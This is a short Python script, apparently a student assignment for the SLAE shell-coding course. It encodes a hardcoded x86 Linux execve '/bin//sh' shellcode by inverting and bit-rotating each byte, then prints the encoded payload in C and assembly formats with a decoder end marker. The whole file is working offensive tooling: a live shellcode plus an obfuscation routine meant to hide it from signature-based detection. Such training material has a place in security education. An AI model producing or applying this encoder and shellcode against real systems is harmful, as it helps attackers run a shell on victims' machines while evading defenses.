#!/usr/bin/env python

# wrapper.py
# Author: jcarabantes
# Student Id: SLAE-1058

import sys

# output functions
def info(m, new_line=None):
	print("\033[1m\033[34m[INFO]\033[0m {0}".format(m))
	if new_line: print("")

def error(m):
	print("\033[1m\033[31m[ERROR]\033[0m {0}".format(m))
	sys.exit(1)

# Rotate left: 0b1001 --> 0b0011
rol = lambda val, r_bits, max_bits: \
	(val << r_bits%max_bits) & (2**max_bits-1) | \
	((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
	((val & (2**max_bits-1)) >> r_bits%max_bits) | \
	(val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))


shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
MARK = "aa"

result = ""
original = ""
section_asm = ""
i = 0

for x in bytearray(shellcode):

	original += "\\x{0:x}".format(x)

	# not
	y = ~x

	# ror
	rol_hex = rol(y, 2, 8)
	
	
	encoded_byte = "\\x{0:x}".format(rol_hex & 0xFF)
	
	if (encoded_byte.lower() == '\\x{0}'.format(MARK)):
		error("Error, found a mark while encoding byte in index: {0}".format(i))
		sys.exit(1)
	
	result += encoded_byte
	section_asm += "0x{0:x},".format(rol_hex & 0xFF)
	i += 1

print("")
info("Original")
info("{0}".format(original), True)
info("Encoded C format + MARK")
info("{0}\\x{1}".format(result, MARK), True)
info("Encoded ASM format + MARK")
info("{0}0x{1}".format(section_asm, MARK), True)
